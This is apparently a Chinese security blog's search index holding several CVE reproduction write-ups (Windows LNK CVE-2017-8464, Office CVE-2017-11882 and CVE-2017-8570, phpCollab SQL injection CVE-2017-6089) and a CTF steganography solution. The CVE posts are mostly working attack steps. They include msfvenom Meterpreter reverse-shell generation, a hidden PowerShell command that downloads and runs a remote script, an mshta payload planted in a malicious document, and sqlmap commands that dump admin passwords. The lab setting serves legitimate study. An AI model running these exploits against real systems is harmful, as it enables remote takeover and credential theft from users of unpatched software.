<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title></title>
      <link href="/2018/09/10/CVE-2017-8464/"/>
      <url>/2018/09/10/CVE-2017-8464/</url>
      <content type="html"><![CDATA[<hr><p>title: CVE-2017-8464远程命令执行漏洞（震网漏洞）复现<br>date: 2018-8-28  </p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://ws1.sinaimg.cn/large/006bMmGagy1fv49mx3qvdj30sh0c976x.jpg" alt=""></h2><a id="more"></a><h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><p>2017年6月13日，微软官方发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危。<br>攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。 当用户在Windows资源管理器或解析.LNK文件的任何其他应用程序中打开此驱动器（或远程共享）时，恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。<br>注释:.LNK是windows系统内应用程序快捷方式文件的文件类型后缀名。 </p><h3 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h3><p>Microsoft Windows 10 Version 1607 for 32-bit Systems<br>Microsoft Windows 10 Version 1607 for x64-based Systems<br>Microsoft Windows 10 for 32-bit Systems<br>Microsoft Windows 10 for x64-based Systems<br>Microsoft Windows 10 version 1511 for 32-bit Systems<br>Microsoft Windows 10 version 1511 for x64-based Systems<br>Microsoft Windows 10 version 1703 for 32-bit Systems<br>Microsoft Windows 10 version 1703 for x64-based Systems<br>Microsoft Windows 7 for 32-bit Systems SP1<br>Microsoft Windows 7 for x64-based Systems SP1<br>Microsoft Windows 8.1 for 32-bit Systems<br>Microsoft Windows 8.1 for x64-based Systems<br>Microsoft Windows RT 8.1<br>服务器系统  </p><p>Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1<br>Microsoft Windows Server 2008 R2 for x64-based Systems SP1<br>Microsoft Windows Server 2008 for 32-bit Systems SP2<br>Microsoft Windows Server 2008 for Itanium-based Systems SP2<br>Microsoft Windows Server 2008 for x64-based Systems SP2<br>Microsoft Windows Server 2012<br>Microsoft Windows Server 2012 R2<br>Microsoft Windows Server 2016   </p><h1 id="漏洞复现过程"><a href="#漏洞复现过程" class="headerlink" title="漏洞复现过程"></a>漏洞复现过程</h1><p>利用原理：</p><p>创建恶意快捷方式，包含恶意执行脚本，点击恶意快捷方式，导致本机中病毒。</p><p>环境搭建：</p><p>攻击机：kali  ip：10.0.0.140</p><p>目标靶机：win2008r2x64 ip:192.168.99.104</p><h3 id="1-kali下生成一个反弹的-ps1的shell"><a href="#1-kali下生成一个反弹的-ps1的shell" class="headerlink" title="1.kali下生成一个反弹的 ps1的shell:"></a>1.kali下生成一个反弹的 ps1的shell:</h3><p>msfvenom  -p   windows/x64/meterpreter/reverse_tcp  lhost=10.0.0.140   lport=5555  -f  psh-reflection&gt;/opt/search.ps1<br><img src="https://images2015.cnblogs.com/blog/1049983/201706/1049983-20170616093207056-632687794.png" alt="image">  </p><h3 id="2-切换到opt目录，然后查看到已生成了search-ps1-的powershell-后门"><a href="#2-切换到opt目录，然后查看到已生成了search-ps1-的powershell-后门" class="headerlink" title="2.切换到opt目录，然后查看到已生成了search.ps1 的powershell 后门"></a>2.切换到opt目录，然后查看到已生成了search.ps1 的powershell 后门</h3><p>cd /opt</p><p>ls<br><img src="https://images2015.cnblogs.com/blog/1049983/201706/1049983-20170616093147728-2091168586.png" alt="image">  </p><h3 id="3-将生成的search-ps1拷贝到-var-www-html目录下"><a href="#3-将生成的search-ps1拷贝到-var-www-html目录下" class="headerlink" title="3.将生成的search.ps1拷贝到/var/www/html目录下"></a>3.将生成的search.ps1拷贝到/var/www/html目录下</h3><p>mv  search.ps1  /var/www/html</p><p>ls<br><img src="https://images2015.cnblogs.com/blog/1049983/201706/1049983-20170616093220650-840360016.png" alt="image">  </p><h3 id="4-启动apache服务"><a href="#4-启动apache服务" class="headerlink" title="4.启动apache服务"></a>4.启动apache服务</h3><p>service apache2 start<br><img src="https://images2015.cnblogs.com/blog/1049983/201706/1049983-20170616093252228-384879567.png" alt="image">  </p><h3 id="5-访问web下的search-ps1，可以直接访问："><a href="#5-访问web下的search-ps1，可以直接访问：" class="headerlink" title="5.访问web下的search.ps1，可以直接访问："></a>5.访问web下的search.ps1，可以直接访问：</h3><p><img src="https://images2015.cnblogs.com/blog/1049983/201706/1049983-20170616093304212-1961781099.png" alt="image">  </p><h3 id="6-在靶机上创建一个powershell远程快捷："><a href="#6-在靶机上创建一个powershell远程快捷：" class="headerlink" title="6.在靶机上创建一个powershell远程快捷："></a>6.在靶机上创建一个powershell远程快捷：</h3><p>powershell -windowstyle hidden -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://10.0.0.140/search.ps1&#39;);test.ps1&quot;" target="_blank" rel="noopener">http://10.0.0.140/search.ps1&#39;);test.ps1&quot;</a><br><img src="https://images2015.cnblogs.com/blog/1049983/201706/1049983-20170616093329931-1021952265.png" alt="image">  </p><h3 id="7-名称为-powershell-exe"><a href="#7-名称为-powershell-exe" class="headerlink" title="7.名称为:powershell.exe"></a>7.名称为:powershell.exe</h3><p><img src="https://images2015.cnblogs.com/blog/1049983/201706/1049983-20170616093340759-346430350.png" alt="image">  </p><h3 id="8-kali下创建监听反弹，并且可以看到成功反弹出靶机的shell"><a href="#8-kali下创建监听反弹，并且可以看到成功反弹出靶机的shell" class="headerlink" title="8.kali下创建监听反弹，并且可以看到成功反弹出靶机的shell:"></a>8.kali下创建监听反弹，并且可以看到成功反弹出靶机的shell:</h3><p>复制代码<br>use exploit/multi/handler</p><p>set payload windows/x64/meterpreter/reverse_tcp</p><p>show options</p><p>set LHOST 10.0.0.140</p><p>set lport  5555  </p><p>exploit<br>复制代码<br><img src="https://images2015.cnblogs.com/blog/1049983/201706/1049983-20170616093405853-1081692101.png" alt="image"><br><img src="https://images2015.cnblogs.com/blog/1049983/201706/1049983-20170616093431087-1144044556.png" alt="image"><br><img src="https://images2015.cnblogs.com/blog/1049983/201706/1049983-20170616093444618-2042957725.png" alt="image">  </p><p>漏洞复现完成</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>office word CVE-2017-11882漏洞复现</title>
      <link href="/2018/08/18/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2018/08/18/CVE-2017-11882%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furwvs9yoyj30tz073mxq.jpg" alt=""><br><a id="more"></a></p><h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><p>2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄然修复了潜伏17年之久的Office远程代码执行漏洞（CVE-2017-11882）。该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。  </p><h3 id="漏洞影响版本："><a href="#漏洞影响版本：" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>Office 365</p><p>Microsoft Office 2000      </p><p>Microsoft Office 2003      </p><p>Microsoft Office 2007 Service Pack 3</p><p>Microsoft Office 2010 Service Pack 2</p><p>Microsoft Office 2013 Service Pack 1</p><p>Microsoft Office 2016</p><h3 id="脚本利用下载链接"><a href="#脚本利用下载链接" class="headerlink" title="脚本利用下载链接"></a>脚本利用下载链接</h3><p><a href="https://github.com/starnightcyber/CVE-2017-11882" target="_blank" rel="noopener">Github传送门</a>  </p><h1 id="漏洞复现过程："><a href="#漏洞复现过程：" class="headerlink" title="漏洞复现过程："></a>漏洞复现过程：</h1><h3 id="生成漏洞弹出计算器"><a href="#生成漏洞弹出计算器" class="headerlink" title="生成漏洞弹出计算器"></a>生成漏洞弹出计算器</h3><p>生成漏洞doc文件，可以弹出计算器如下：（脚本在Github传送地址）</p><p>starnight:CVE-2017-11882 starnight$ python Command_CVE-2017-11882.py -c “cmd.exe /c calc.exe” -o test.doc<br>[*] Done ! output file &gt;&gt; test.doc &lt;&lt;<br>用命令生成test.doc后，用Offcie 2013打开这个文件，可以看到在打开doc文件的时候，弹出计算器。<br><img src="https://images2017.cnblogs.com/blog/624934/201711/624934-20171122104018899-1902346095.png" alt="image">  </p><h3 id="生成漏洞获取shell"><a href="#生成漏洞获取shell" class="headerlink" title="生成漏洞获取shell"></a>生成漏洞获取shell</h3><p>这里我们参考链接2，使用metasploit，将脚本PS_shell.rb放到metasploit exploit的某个路径下：</p><p>　　我的kali下的metasploit所在路径是：/usr/share/metasploit-framework， 可以放在如下目录：（这里我们新创建一个new-exps目录存放这个脚本）</p><p>root@kali:/usr/share/metasploit-framework/modules/exploits/windows/new-exps# pwd<br>/usr/share/metasploit-framework/modules/exploits/windows/new-exps<br>root@kali:/usr/share/metasploit-framework/modules/exploits/windows/new-exps# ls<br>PS_shell.rb<br>　　这样在启动msf时就能直接使用了：</p><p>msf &gt; use exploit/windows/new-exps/PS_shell<br>　　漏洞利用过程：</p><p>复制代码<br>msf &gt; use exploit/windows/new-exps/PS_shell<br>msf exploit(PS_shell) &gt; set payload windows/meterpreter/reverse_tcp<br>payload =&gt; windows/meterpreter/reverse_tcp<br>msf exploit(PS_shell) &gt; set lhost 192.168.1.102<br>lhost =&gt; 192.168.1.102<br>msf exploit(PS_shell) &gt; set uripath abc<br>uripath =&gt; abc<br>msf exploit(PS_shell) &gt; exploit<br>[*] Exploit running as background job 0.</p><p>[<em>] Started reverse TCP handler on 192.168.1.102:4444<br>msf exploit(PS_shell) &gt; [</em>] Using URL: <a href="http://0.0.0.0:8080/abc" target="_blank" rel="noopener">http://0.0.0.0:8080/abc</a><br>[<em>] Local IP: <a href="http://192.168.1.102:8080/abc" target="_blank" rel="noopener">http://192.168.1.102:8080/abc</a><br>[</em>] Server started.<br>[*] Place the following DDE in an MS document:<br>mshta.exe “<a href="http://192.168.1.102:8080/abc&quot;" target="_blank" rel="noopener">http://192.168.1.102:8080/abc&quot;</a><br>复制代码<br>　　从上面可以看出，我们要连接到这个地址：<a href="http://192.168.1.102:8080/abc" target="_blank" rel="noopener">http://192.168.1.102:8080/abc</a>  </p><p>　　我们需要用上面那个脚本重新生成这样一个存在漏洞的doc文件：　　</p><p>starnight:CVE-2017-11882 starnight$ python Command_CVE-2017-11882.py -c “mshta <a href="http://192.168.1.102:8080/abc&quot;" target="_blank" rel="noopener">http://192.168.1.102:8080/abc&quot;</a> -o test.doc<br>[*] Done ! output file &gt;&gt; test.doc &lt;&lt;<br>　　再用Office打开这个doc，就能拿到meterpreter了：<br>　　<img src="https://images2017.cnblogs.com/blog/624934/201711/624934-20171122113100430-173114849.png" alt="image"><br>　　<img src="https://images2017.cnblogs.com/blog/624934/201711/624934-20171122113410571-1535679967.png" alt="image"></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>CVE-2017-6089 SQL注入漏洞复现</title>
      <link href="/2018/08/08/2017-6089/"/>
      <url>/2018/08/08/2017-6089/</url>
      <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyl7h7b3j30cr07e78m.jpg" alt=""><br><a id="more"></a></p><h1 id="漏洞介绍："><a href="#漏洞介绍：" class="headerlink" title="漏洞介绍："></a>漏洞介绍：</h1><p>漏洞被描述为：在phpcollab 2.5.1以及更早版本中存在SQL注入漏洞，允许远程攻击者执行任意的SQL指令。漏洞存在于3处，topics/deletetopics.php中project参数和id参数，bookmarks/deletebookmarks.php中的id参数，以及calendar/deletecalendar.php中的id参数。<br>在本地虚拟机中搭建此系统，逐一查看这些SQL注入点。  </p><h1 id="工具选择："><a href="#工具选择：" class="headerlink" title="工具选择："></a>工具选择：</h1><p>1.虚拟机中搭建win7<br>2.安装java环境确保能够使用burpsuite<br>2.配置好Phpcollab<br>3.配置好PHPstudy  </p><p>下载phpCollab-v2.5.1,放到web根目录下安装<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyq1d0tzj30uu0ja0ud.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyqzk4frj30uu0ja0ud.jpg" alt=""><br>登陆账号是admin<br>密码是phpcadmin<br>然后添加一个项目<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyrd4pr9j30oe0kdgmo.jpg" alt=""><br>然后添加一个讨论<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyrw5xicj30om0ewweq.jpg" alt=""></p><h1 id="脚本分析："><a href="#脚本分析：" class="headerlink" title="脚本分析："></a>脚本分析：</h1><p>在/phpCollab-v2.5.1/topics/deletetopics.php第67~71行处:<br>$id = str_replace(“**”,”,”,$id);<br>$tmpquery = “WHERE topic.id IN($id) ORDER BY topic.subject”;<br>$listTopics = new request();<br>$listTopics-&gt;openTopics($tmpquery);<br>$comptListTopics = count($listTopics-&gt;top_id);</p><p>代码首先把参数id中的**替换成逗号,然后直接拼接到SQL语句中赋值给$tmpquery,接着被传入openTopics()方法.<br>跟进该方法,在/phpCollab-v2.5.1/includes/request.class.php第509行左右,<br>function openTopics($querymore,$start=””,$rows=””)<br>    {<br>        global $tableCollab, $strings, $res, $row, $databaseType, $initrequest;</p><pre><code>    $this-&gt;connectClass();    $sql = $initrequest[&quot;topics&quot;];    $sql .= &apos; &apos;.$querymore;    if ($databaseType == &quot;mysql&quot; &amp;&amp; $start != &quot;&quot;)     {        $sql .= &quot; LIMIT $start,$rows&quot;;    }    if ($databaseType == &quot;postgresql&quot; &amp;&amp; $start != &quot;&quot;)     {        $sql .= &quot; LIMIT $rows OFFSET $start&quot;;    }    $index = $this-&gt;query($sql);    while($this-&gt;fetch())     {        $this-&gt;top_id[] = ($row[0]);        $this-&gt;top_project[] = ($row[1]);        $this-&gt;top_owner[] = ($row[2]);        $this-&gt;top_subject[] = ($row[3]);        $this-&gt;top_status[] = ($row[4]);        $this-&gt;top_last_post[] = ($row[5]);        $this-&gt;top_posts[] = ($row[6]);        $this-&gt;top_published[] = ($row[7]);        $this-&gt;top_mem_id[] = ($row[8]);        $this-&gt;top_mem_login[] = ($row[9]);        $this-&gt;top_mem_name[] = ($row[10]);        $this-&gt;top_mem_email_work[] = ($row[11]);        $this-&gt;top_pro_id[] = ($row[12]);        $this-&gt;top_pro_name[] = ($row[13]);    }    $this-&gt;close();}</code></pre><p>传入之后又进行了一次SQL语句拼接,然后传入了query()方法,跟进该方法,在/phpCollab-v2.5.1/includes/request.class.php第35行左右,<br>function query($sql)<br>    {<br>        global $res,$databaseType,$comptRequest;</p><pre><code>$comptRequest = $comptRequest + 1;if ($databaseType == &quot;mysql&quot;) {    $this-&gt;index = mysql_query($sql, $res);}</code></pre><p>……<br>}<br>可以看到,$sql传入后进入mysql_query(),带入数据库进行SQL查询.<br>整个过程没有做过滤,所以产生了SQL注入漏洞。  </p><h1 id="漏洞复现过程："><a href="#漏洞复现过程：" class="headerlink" title="漏洞复现过程："></a>漏洞复现过程：</h1><p>访问：<a href="http://10.18.74.150/php/topics/deletetopics.php?project=1&amp;PHPSESSID=67799533afe506fca2db18a7ccc14104&amp;id=1" target="_blank" rel="noopener">http://10.18.74.150/php/topics/deletetopics.php?project=1&amp;PHPSESSID=67799533afe506fca2db18a7ccc14104&amp;id=1</a><br>利用burpsuite抓包,将请求保存为sql.txt<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furywdf98tj30xk0ev0ud.jpg" alt="">  </p><h3 id="1-检测注入"><a href="#1-检测注入" class="headerlink" title="1. 检测注入"></a>1. 检测注入</h3><p> -r “C:\Users\33715\Desktop\sql.txt” –threads=10 –dbms=mysql<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furywwvg28j31br0c03zn.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyx2j8gaj31bb0bvq4p.jpg" alt=""></p><h3 id="2-查库名"><a href="#2-查库名" class="headerlink" title="2. 查库名"></a>2. 查库名</h3><p> -r “C:\Users\33715\Desktop\sql.txt” –threads=10 –dbms=mysql –current-db<br> <img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyxoe6qzj30o406g74s.jpg" alt=""></p><h3 id="3-查表名"><a href="#3-查表名" class="headerlink" title="3. 查表名"></a>3. 查表名</h3><p> -r “C:\Users\33715\Desktop\sql.txt” –threads=10 –dbms=mysql -D phpco –tables<br> <img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyy6eib8j307p0gm3yt.jpg" alt=""></p><h3 id="4-查表members中的列名"><a href="#4-查表members中的列名" class="headerlink" title="4. 查表members中的列名"></a>4. 查表members中的列名</h3><p>  -r “C:\Users\33715\Desktop\sql.txt” –threads=10 –dbms=mysql -D phpco -T members –columns<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyyk5l2kj31gm0jtacb.jpg" alt="">  </p><h3 id="5-查列name和password中的数据"><a href="#5-查列name和password中的数据" class="headerlink" title="5. 查列name和password中的数据"></a>5. 查列name和password中的数据</h3><p> -r “C:\Users\33715\Desktop\sql.txt” –threads=10 –dbms=mysql -D phpco -T members -C name,password–dump<br> <img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyz0928nj312s06pjrs.jpg" alt=""><br> 通过SQL注入漏洞,得到了管理员的密码。<br> 至此漏洞复现完成。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Office CVE-2017-8570 远程代码执行漏洞复现</title>
      <link href="/2018/07/30/2017-8570/"/>
      <url>/2018/07/30/2017-8570/</url>
      <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furwvs9yoyj30tz073mxq.jpg" alt=""><br><a id="more"></a></p><h1 id="漏洞背景："><a href="#漏洞背景：" class="headerlink" title="漏洞背景："></a>漏洞背景：</h1><p>2017年7月，微软在例行的月度补丁中修复了多个Microsoft Office漏洞，其中一个编号为CVE-2017-8570的漏洞是一个逻辑漏洞，利用方法简单，影响范围广。由于该漏洞和三年前的SandWorm（沙虫）漏洞非常类似，因此被称之为“沙虫”二代漏洞。2017年7月下旬，有国外黑客在github上传了CVE-2017-8570漏洞的利用代码，但随即删除；7月29日，有多利用该漏洞的恶意文件开始在互联网上传播。<br>该漏洞为Microsoft Office的一个远程代码执行漏洞。其成因是Microsoft PowerPoint执行时会初始化“Script”Moniker对象，而在PowerPoint播放动画期间会激活该对象，从而执行sct脚本（Windows Script Component）文件。<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furwvs9yoyj30tz073mxq.jpg" alt=""></p><h1 id="相关工具使用"><a href="#相关工具使用" class="headerlink" title="相关工具使用"></a>相关工具使用</h1><p>本次漏洞复现需要用到VMware Workstation来搭建两个虚拟机，一个win7作为靶机（需要安装office PowerPoint 2016及以前的版本）和一个Kali作为攻击机（版本使用2.0），以及kali自带渗透工具MSF。<br>附上exp下载链接：<a href="https://github.com/tezukanice/Office8570.git" target="_blank" rel="noopener">https://github.com/tezukanice/Office8570.git</a></p><hr><h1 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h1><h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><p>首先在kali中获取IP地址。使用命令”python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u <a href="http://192.168.237.129/logo.doc&quot;在攻击机中生成包含恶意代码的PPSX文件。![](https://ws1.sinaimg.cn/large/006bMmGagy1furxdfbqu8j30qr0c9gq8.jpg)" target="_blank" rel="noopener">http://192.168.237.129/logo.doc&quot;在攻击机中生成包含恶意代码的PPSX文件。![](https://ws1.sinaimg.cn/large/006bMmGagy1furxdfbqu8j30qr0c9gq8.jpg)</a>  </p><h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><p>使用命令msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.237.129 LPORT=6666 -f exe &gt; shell.exe在攻击机中生成反弹shell的exe文件，6666为攻击机的监听端口（端口可随意）。<img src="https://ws1.sinaimg.cn/large/006bMmGagy1furxgd80w5j30mn0bg77x.jpg" alt=""></p><h4 id="三"><a href="#三" class="headerlink" title="三"></a>三</h4><p>监听来自ppsx执行反弹shell，使用命令：python cve-2017-8570_toolkit.py -M exp -e <a href="http://192.168.237.129/shell.exe" target="_blank" rel="noopener">http://192.168.237.129/shell.exe</a> -l shell.exe<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furxh7p2usj30ku065q46.jpg" alt=""></p><h4 id="四"><a href="#四" class="headerlink" title="四"></a>四</h4><p>开启msf，使用命令：msfconsole<img src="https://ws1.sinaimg.cn/large/006bMmGagy1furxhqj8m7j30ky0e5act.jpg" alt=""><br>分别使用如下命令设置监听：<br>~ msfconsole<br>msf &gt; use exploit/multi/handler<br>msf &gt; set LHOST 192.168.237.129<br>msf &gt; set LPORT 6666<br>msf &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>msf &gt; exploit<br>开启监听</p><h4 id="五"><a href="#五" class="headerlink" title="五"></a>五</h4><p>最后将包含恶意代码的PPTX发送给靶机并在靶机上打开。<br>攻击成功<img src="https://ws1.sinaimg.cn/large/006bMmGagy1furxk8elf3j30lb07nwfo.jpg" alt="">  </p><p>攻击成功后可以在靶机上执行各种shell命令，测试中我使用了md test，<br>效果如图：<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furxlqrvt1j31hc0pnb2a.jpg" alt=""><br>至此漏洞复现完成</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>国家网络安全周宣传周“巅峰极客”CTF misc---图片隐写术的简单示范</title>
      <link href="/2018/07/24/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF/"/>
      <url>/2018/07/24/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF/</url>
      <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/006bMmGaly1fu61zi1u1dj30f80jk11f.jpg" alt=""><br><a id="more"></a></p><h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p>深入学习贯彻习近平新时代中国特色社会主义思想，践行习近平总书记网络强国战略思想，落实全国网络安全和信息化工作会议精神，切实维护好网络安全，为成都加快建设全面体现新发展理念的城市营造良好网络环境。</p><p>7月21日，2018国家网络安全宣传周重磅活动之一“巅峰极客”网络安全技能挑战赛暨自主可控安全共测大赛第一场线上赛举行。据悉，线上赛共有3268支战队、上万人同时在线比赛，仅独立IP数就达8382个，吸引了全国超过160000人次在线观看。</p><p>本次活动中我和其他三位同学共同组成RNGNB战队参加了比赛，在此选用的题目是比赛中一道图片隐写术的题。<br>该题目给出了一张图片： </p><p><img src="https://ws1.sinaimg.cn/large/006bMmGaly1ftvel6yy7uj30e90e8gos.jpg" alt=""><br><a href="https://share.weiyun.com/5GSqmQl" target="_blank" rel="noopener">源文件下载地址</a><br>然后要求写出内含的flag。    </p><h3 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h3><p>首先使用工具StegSolve<a href="https://u14147674.ctfile.com/fs/14147674-235575911" target="_blank" rel="noopener">下载地址</a>来对图片进行分析。<a href="https://blog.csdn.net/cf406061841/article/details/79198351" target="_blank" rel="noopener">StegSolve的简单介绍</a> 特别注意使用的时候要提前配置好java环境。<br>打开StegSolve之后如图所示：<br><img src="https://ws1.sinaimg.cn/large/006bMmGaly1ftvevaa2lkj30er0hntc3.jpg" alt=""><br>首先进行简单的观察分析，看看是否FLAG直接隐藏在了图片里。包括分层查验后，发现并不能看出什么东西。</p><p>之后选择Analyse–&gt;Data Extract进行分析<br><img src="https://ws1.sinaimg.cn/large/006bMmGaly1ftvezmrnn5j309m04zaag.jpg" alt="">  </p><h3 id="分析设置"><a href="#分析设置" class="headerlink" title="分析设置"></a>分析设置</h3><p>如图进行设置，可以在红圈内看到++++++ +[.]之类的“乱码”<br><img src="https://ws1.sinaimg.cn/large/006bMmGaly1ftvf0pimwoj30kg0fst9w.jpg" alt=""><br>在将Red和Green分别都如之前一样设置后进行分析，发现了很有趣的东西：<br><img src="https://ws1.sinaimg.cn/large/006bMmGaly1ftvf4p7swfj30cx050dfp.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006bMmGaly1ftvf4wveyej30by059jr9.jpg" alt="">  </p><h3 id="进行编译"><a href="#进行编译" class="headerlink" title="进行编译"></a>进行编译</h3><p>熟悉的人可能一眼就能看出端倪，这是<a href="https://baike.baidu.com/item/Brainfuck/1152785?fr=aladdin" target="_blank" rel="noopener">Brainfuck（BF）</a>语言。这时将分析出的内容保存为二进制格式，之后使用<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">BF在线编译器</a>进行编译，结果分别如下图：<br><img src="https://ws1.sinaimg.cn/large/006bMmGaly1ftvfbdr88mj30fd0bqdid.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006bMmGaly1ftvfbjexr5j30fh0btdie.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006bMmGaly1ftvfbp9prnj30fd0bitb6.jpg" alt=""><br>得到结果flag为：“flag｛db640436-7839-4050-8339-75a972fc553c｝”验证之后答案正确，完成解答。</p>]]></content>
      
      
    </entry>
    
  
  
</search>
